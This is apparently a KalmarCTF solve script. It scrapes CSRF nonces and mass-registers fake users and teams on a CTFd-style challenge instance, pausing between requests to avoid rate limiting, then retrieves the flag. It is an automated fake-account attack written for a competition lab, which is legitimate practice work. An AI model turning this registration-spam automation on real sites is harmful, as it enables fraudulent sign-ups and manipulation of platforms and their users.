#!/usr/bin/env python3
import requests
import re
import random
import string
import time
from bs4 import BeautifulSoup

# Challenge instance URL
URL = "https://c9c98c4a5d85549fb14dd757bf0ddcb6-59028.inst1.chal-kalmarc.tf"
DEBUG = True  # Set to True for detailed debugging information

def random_string(length=6):
    """Generate a random string for usernames, emails, etc."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def debug_response(response, step):
    """Print debug information about the response."""
    if DEBUG:
        print(f"\n--- DEBUG: {step} ---")
        print(f"Status Code: {response.status_code}")
        print(f"URL: {response.url}")
        
        # Find any alert messages (errors or success)
        soup = BeautifulSoup(response.text, 'html.parser')
        alerts = soup.find_all('div', class_='alert')
        if alerts:
            print("Alert messages found:")
            for alert in alerts:
                print(f"  - {alert.text.strip()}")
        
        print("--- END DEBUG ---\n")

def extract_csrf_token(html_content):
    """Extract CSRF token from HTML content."""
    soup = BeautifulSoup(html_content, 'html.parser')
    nonce_input = soup.find('input', {'id': 'nonce'})
    if nonce_input and 'value' in nonce_input.attrs:
        token = nonce_input['value']
        if DEBUG:
            print(f"Found CSRF token: {token}")
        return token
    
    # Fallback to regex
    match = re.search(r'name="nonce" value="([^"]+)"', html_content)
    if match:
        token = match.group(1)
        if DEBUG:
            print(f"Found CSRF token (regex): {token}")
        return token
    
    print("Failed to extract CSRF token")
    return None

def create_fake_team():
    """Create a new user and team using the same session."""
    session = requests.Session()
    
    # Step 1: Get register page and extract CSRF token
    print("Getting registration page...")
    try:
        register_response = session.get(f"{URL}/register")
        if register_response.status_code != 200:
            print(f"Failed to access register page: {register_response.status_code}")
            return False
    except Exception as e:
        print(f"Error accessing register page: {e}")
        return False
    
    csrf_token = extract_csrf_token(register_response.text)
    if not csrf_token:
        print("Failed to get CSRF token from register page")
        return False
    
    # Step 2: Register a new user
    username = f"fake_{random_string()}"
    email = f"{username}@example.com"
    password = "Password123"  # Using a stronger password
    
    print(f"Registering user: {username}")
    register_data = {
        'name': username,
        'email': email,
        'password': password,
        'nonce': csrf_token,
        '_submit': 'Submit'
    }
    
    try:
        register_response = session.post(f"{URL}/register", data=register_data, allow_redirects=True)
        debug_response(register_response, "User Registration")
    except Exception as e:
        print(f"Error during registration: {e}")
        return False
    
    # Check if registration was successful (we should be redirected away from register page)
    if "/register" in register_response.url:
        print(f"Registration failed for {username} - still on register page")
        return False
    
    print(f"Registration successful for {username}")
    
    # Step 3: Get the team creation page and extract CSRF token
    print("Getting team creation page...")
    try:
        team_page_response = session.get(f"{URL}/teams/new")
        debug_response(team_page_response, "Team Creation Page")
        
        if team_page_response.status_code != 200:
            print(f"Failed to access team creation page: {team_page_response.status_code}")
            return False
            
        # Check if we're redirected to login page (session issue)
        if "/login" in team_page_response.url:
            print("Redirected to login page - session may have expired")
            return False
    except Exception as e:
        print(f"Error accessing team creation page: {e}")
        return False
    
    csrf_token = extract_csrf_token(team_page_response.text)
    if not csrf_token:
        print("Failed to get CSRF token from team creation page")
        return False
    
    # Step 4: Create a new team
    team_name = f"team_{random_string()}"
    team_password = "Password123"  # Using a stronger password
    
    print(f"Creating team: {team_name}")
    team_data = {
        'name': team_name,
        'password': team_password,
        '_submit': 'Create',
        'nonce': csrf_token
    }
    
    try:
        team_response = session.post(f"{URL}/teams/new", data=team_data, allow_redirects=True)
        debug_response(team_response, "Team Creation")
    except Exception as e:
        print(f"Error during team creation: {e}")
        return False
    
    # Check if team creation was successful by looking at redirection
    # Success is indicated by being redirected to /challenges or any page other than /teams/new
    if "/teams/new" in team_response.url:
        print(f"Team creation failed for {team_name} - still on team creation page")
        return False
    
    if "/challenges" in team_response.url:
        print(f"Successfully created team: {team_name} (redirected to challenges page)")
        return True
    else:
        print(f"Successfully created team: {team_name} (redirected to {team_response.url})")
        return True

def check_flag(username, password):
    """Check if the flag is available."""
    session = requests.Session()
    
    # Login first
    print(f"Logging in as {username}...")
    register_response = session.get(f"{URL}/login")
    csrf_token = extract_csrf_token(register_response.text)
    
    if not csrf_token:
        print("Failed to get CSRF token for login")
        return
    
    login_data = {
        'name': username,
        'password': password,
        'nonce': csrf_token,
        '_submit': 'Submit'
    }
    
    login_response = session.post(f"{URL}/login", data=login_data, allow_redirects=True)
    if "/login" in login_response.url:
        print("Login failed")
        return
    
    # Check flag
    print("Checking for flag...")
    flag_response = session.get(f"{URL}/flag")
    debug_response(flag_response, "Flag Check")
    
    # Check for flag pattern
    flag_pattern = re.search(r'kalmar\{[^}]+\}', flag_response.text)
    if flag_pattern:
        print(f"\n🚩 FLAG FOUND: {flag_pattern.group(0)}")
    else:
        print("\n⚠️ Flag not found. You may need to solve a challenge first.")

def main():
    print(f"Starting team creation for {URL}")
    print("=" * 60)
    
    mode = input("Choose mode: (1) Create fake teams or (2) Check flag [1/2]: ")
    
    if mode == "2":
        username = input("Enter your username: ")
        password = input("Enter your password: ")
        check_flag(username, password)
        return
    
    # Ask how many teams to create
    try:
        num_teams = int(input("How many fake teams to create? ") or "30")
    except ValueError:
        num_teams = 30
        print("Invalid input. Using default: 30")
    
    successful = 0
    failed = 0
    
    for i in range(num_teams):
        print(f"\nCreating fake team {i+1}/{num_teams}...")
        if create_fake_team():
            successful += 1
        else:
            failed += 1
        
        # Brief delay to avoid rate limiting
        time.sleep(2)
        
        # Progress update every 5 teams
        if (i + 1) % 5 == 0 or (i + 1) == num_teams:
            print(f"Progress: {successful} successful, {failed} failed")
    
    print("\nTeam creation finished!")
    print(f"Total: {successful} successful, {failed} failed")
    
    print("\nNext steps:")
    print("1. Create your own account and team on the website")
    print("2. Solve at least one challenge")
    print("3. Visit the /flag endpoint to get the flag")
    print("\nOr you can check for the flag by running this script again and choosing option 2")

if __name__ == "__main__":
    main()